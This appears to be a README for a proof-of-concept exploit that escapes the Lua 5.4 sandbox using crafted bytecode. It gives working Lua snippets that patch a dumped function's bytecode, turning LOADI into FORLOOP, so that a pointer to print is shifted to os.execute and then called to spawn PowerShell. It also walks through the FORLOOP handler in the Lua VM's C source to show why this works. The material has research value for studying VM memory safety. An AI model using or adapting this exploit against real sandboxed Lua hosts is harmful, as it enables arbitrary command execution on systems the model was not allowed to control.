# Lua 5.4(.4) malicious bytecode sandbox escape
This is a simple proof-of-concept script that will execute PowerShell on a Windows 10 system.

This can be adapted to work for Linux by changing the offset and argument.

Note that using this may not work for you, as you will have to get the difference between `os.execute` and `print`.
For unmodified Lua, this is as simple as running:

```lua
print(tonumber(tostring(os.execute):match("(0x%x+)")) - tonumber(tostring(print):match("(0x%x+)")))
```

For something like a modified version where you do not have access to `os.execute`, or the addresses of functions are not printed, you may have to disassemble it and find the offsets.

If you do not have access to `load`, or `load` cannot run bytecode, or `os.execute` is completely removed from the binary, this will not work. 

# How it works (script)
Note that this is a pretty basic example of how it works, and I don't really know the deep internals of the Lua VM, so some stuff may not make sense.

### Step by step execution:
* We create a useless function, which only reorders the registers for the instruction that we will modify. This function contains the instruction `LOADI 5 1234` (load integer 1234 into register 5), so we can easily spot it and replace it.
```lua
local victim = function(input, increment)
    -- Reorder registers for the FORLOOP instruction
    local o, f, i = input, 1, increment

    -- This instruction (LOADI 5 1234) will be replaced with FORLOOP 1 0.
    local repl = 1234
    return o
end
```
* We dump the bytecode of the function, and replace the instruction with our target instruction, `FORLOOP 1 0` (iterate the for loop and jump back 0 instructions (probably))
```lua
local bytecode = string.dump(victim):gsub
    ("\129\130\104\130" --[[ LOADI 5 1234 ]],
     "\73\1\0\0"        --[[ FORLOOP 1 0 ]])
```
* We load the malicious bytecode into a new function, and call it with `print`, and the offset.
```lua
local malicious = load(bytecode)
local target = malicious(print, 0x11110000) -- example offset, will return the function with address of print + 0x11110000
```
* Using the internals for the `FORLOOP` instruction, our target will have it's pointer incremented, and then returned to us.
```lua
-- (example addresses)
print(print)        --> function: 0x12340000
print(os.execute)   --> function: 0x23450000
-- The difference between os.execute and print is 0x11110000 bytes.
print(target)       --> function: 0x23450000
```
* Call the returned function with our arguments (`powershell`). This will spawn a shell.
```lua
target("powershell") --> will spawn powershell
```
# How it works (low-level C)
This block of code handles the `FORLOOP` instruction:
```c
vmcase(OP_FORLOOP) {
    if (ttisinteger(s2v(ra + 2))) {  /* integer loop? */
        lua_Unsigned count = l_castS2U(ivalue(s2v(ra + 1)));
        if (count > 0) {  /* still more iterations? */
            lua_Integer step = ivalue(s2v(ra + 2));
            lua_Integer idx = ivalue(s2v(ra));  /* internal index */
            chgivalue(s2v(ra + 1), count - 1);  /* update counter */
            idx = intop(+, idx, step);  /* add step to index */
            chgivalue(s2v(ra), idx);  /* update internal index */
            setivalue(s2v(ra + 3), idx);  /* and control variable */
            pc -= GETARG_Bx(i);  /* jump back */
        }
    }
    else if (floatforloop(ra))  /* float loop */
        pc -= GETARG_Bx(i);  /* jump back */
    updatetrap(ci);  /* allows a signal to break the loop */
    vmbreak;
}
```
### Notes:
* some stuff probably isn't true as I don't know how it works deep down
* `ra` = 1, first argument of the `FORLOOP` instruction (`FORLOOP 1 0`)
* `GETARG_Bx(i)` = 0, second argument of the `FORLOOP` instruction
* registers `ra` through `ra + 2` are considered internal, but we manipulated the bytecode, so we can modify them. `ra + 3` is the actual counter that you can read in Lua.
* All registers are read as integers, as the `FORPREP` instruction checks that they should be integers (or floats, but the VM thinks we are in a integer loop), and you can only have the `FORLOOP` instruction inside a `FORPREP` statement.

### Step by step execution:
* The code checks if we are in an integer loop. Since we are, we enter the integer loop block.
```c
if (ttisinteger(s2v(ra + 2))) {  /* integer loop? */
```
* Then, the VM reads from register `ra + 1`, which is the amount of iterations left.
```c
    lua_Unsigned count = l_castS2U(ivalue(s2v(ra + 1)));
```
* The VM checks if the amount is greater than 0. Since we put 1 into it, we continue into the block.
```c
    if (count > 0) {  /* still more iterations? */
```
* The step value is read from register `ra + 2`. This is the `increment` variable in the function. In our function, we put this as the offset.
```c
        lua_Integer step = ivalue(s2v(ra + 2));
```
* The index value is read from register `ra`. This is the `input` variable in the function. In our function, we put this as the `print` function.
```c
        lua_Integer idx = ivalue(s2v(ra));  /* internal index */
```
* The code then decrements the amount of iterations left. This prevents an infinite loop.
```c
        chgivalue(s2v(ra + 1), count - 1);  /* update counter */
```
* Next, the index is incremented by the step. This means that our function pointer will be incremented by the offset.
```c
        idx = intop(+, idx, step);  /* add step to index */
```
* The new index is both written to the internal index, and the real index value. Since the internal index value is only **changed**, and not **set**, the type does not change into an integer. (for performance)
```c
        chgivalue(s2v(ra), idx);  /* update internal index */
        setivalue(s2v(ra + 3), idx);  /* and control variable */
```
* The PC jumps back 0 instructions. This puts us back into the same instruction, but since the count is now 0, the instruction does not run.
```c
        pc -= GETARG_Bx(i);  /* jump back */
    }
}
```
* The internal index is now the address we want for our instruction, and we can call it.